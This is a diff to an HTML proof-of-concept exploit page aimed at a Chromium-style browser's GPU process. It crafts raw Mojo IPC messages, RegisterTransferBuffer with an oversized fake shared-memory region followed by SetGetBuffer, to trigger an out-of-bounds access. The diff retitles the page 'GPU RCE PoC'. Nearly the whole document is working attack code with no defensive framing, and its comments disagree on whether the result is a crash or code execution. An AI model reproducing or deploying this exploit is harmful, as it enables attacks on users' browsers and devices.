@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RegisterTransferBuffer OOB PoC – Reliable</title>
+    <title>Reliable GPU Crash – RegisterTransferBuffer + SetGetBuffer</title>
 </head>
 <body>
-    <h1>Reliable GPU Crash</h1>
+    <h1>GPU RCE PoC (Reliable)</h1>
     <p id="log"></p>
     <script>
     (async function() {
@@ -19,48 +19,78 @@
             interceptor.oninterfacerequest = (e) => {
                 interceptor.stop();
                 const remote = new gpu.mojom.CommandBufferPtr(e.handle);
+                const pipe = remote.ptr.getHandle();
 
-                // --- STEP 1: Register corrupted transfer buffer (ordinal 4) ---
+                // ============================================================
+                // MESSAGE 1: RegisterTransferBuffer (ordinal 4)
+                // ============================================================
                 let payload = new ArrayBuffer(256);
                 let view = new DataView(payload);
-                // RegisterTransferBuffer_Params_Data (24 bytes)
-                view.setUint32(0, 24, true);          // struct size
-                view.setUint32(4, 0, true);           // version
-                view.setInt32(8, 0x1234, true);       // Buffer ID
-                view.setUint32(12, 0, true);          // padding
-                // Pointer to fake SharedMemoryRegion
-                view.setBigInt64(16, BigInt(0x40 - 0x10), true);
 
-                // Fake SharedMemoryRegion at offset 0x40
-                view.setUint32(0x40, 24, true);       // struct size
-                view.setUint32(0x44, 0, true);        // version
-                view.setUint32(0x48, 0, true);        // handle index 0
-                view.setUint32(0x4C, 0, true);        // padding
-                // Crucial: size slightly larger than the real shared buffer (4 KB + 1)
-                view.setBigUint64(0x50, BigInt(0x1001), true); // 4097 bytes → OOB
+                // --- Mojo message header (16 bytes) ---
+                view.setUint32(0, 2, true);          // version
+                view.setUint32(4, 0, true);          // flags
+                view.setUint32(8, 4, true);          // ordinal = RegisterTransferBuffer
+                view.setUint32(12, 0, true);         // request_id
 
+                // --- RegisterTransferBuffer_Params_Data (starts at offset 16) ---
+                view.setUint32(16, 24, true);        // struct size
+                view.setUint32(20, 0, true);         // version
+                view.setInt32(24, 0x1234, true);     // buffer ID
+                view.setUint32(28, 0, true);         // padding
+
+                // Pointer to SharedMemoryRegion (relative offset)
+                // The pointer field is at offset 32. Target at offset 0x50.
+                // Relative offset = 0x50 - (32 + 8) = 0x50 - 0x28 = 0x28
+                view.setBigInt64(32, BigInt(0x28), true);
+
+                // --- Fake SharedMemoryRegion at offset 0x50 ---
+                view.setUint32(0x50, 24, true);      // struct size
+                view.setUint32(0x54, 0, true);       // version
+                view.setUint32(0x58, 0, true);       // handle index (0 = first attached handle)
+                view.setUint32(0x5C, 0, true);       // padding
+                // Size: 4097 bytes → out-of-bounds when used (real buffer is 4 KB)
+                view.setBigUint64(0x60, BigInt(0x1001), true);
+
+                // Create the valid 4 KB shared buffer to attach
                 const sharedBuffer = Mojo.createSharedBuffer(4096);
                 const handles = [sharedBuffer.handle];
-                remote.ptr.getHandle().writeMessage(payload, handles);
+
+                // Send the first message
+                pipe.writeMessage(payload, handles);
                 log('Sent RegisterTransferBuffer (id=0x1234)');
 
-                // --- STEP 2: Force use of the corrupted buffer via SetGetBuffer (ordinal 1) ---
-                payload = new ArrayBuffer(16);
-                view = new DataView(payload);
-                view.setUint32(0, 16, true);       // struct size
-                view.setUint32(4, 0, true);        // version
-                view.setInt32(8, 0x1234, true);    // buffer ID (must match)
-                remote.ptr.getHandle().writeMessage(payload, []);
+                // ============================================================
+                // MESSAGE 2: SetGetBuffer (ordinal 1)
+                // ============================================================
+                const payload2 = new ArrayBuffer(32);
+                const view2 = new DataView(payload2);
+
+                // --- Mojo message header (16 bytes) ---
+                view2.setUint32(0, 2, true);         // version
+                view2.setUint32(4, 0, true);         // flags
+                view2.setUint32(8, 1, true);         // ordinal = SetGetBuffer
+                view2.setUint32(12, 0, true);        // request_id
+
+                // --- SetGetBuffer_Params_Data (16 bytes) ---
+                view2.setUint32(16, 16, true);       // struct size
+                view2.setUint32(20, 0, true);        // version
+                view2.setInt32(24, 0x1234, true);    // buffer ID (must match RegisterTransferBuffer)
+
+                // Send the second message (no handles needed)
+                pipe.writeMessage(payload2, []);
                 log('Sent SetGetBuffer (id=0x1234)');
 
-                log('Exploit sent – GPU process should crash now.');
+                log('Exploit sent – GPU process should crash NOW.');
             };
             interceptor.start();
 
-            // 2. Create WebGL context to trigger CommandBuffer creation
+            // 2. Create a WebGL context to trigger command buffer creation
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (!gl) throw new Error('WebGL not available');
+
+            // Wait briefly for the interceptor to fire
             await new Promise(resolve => setTimeout(resolve, 1000));
         } catch (err) {
             log('Error: ' + err.message);
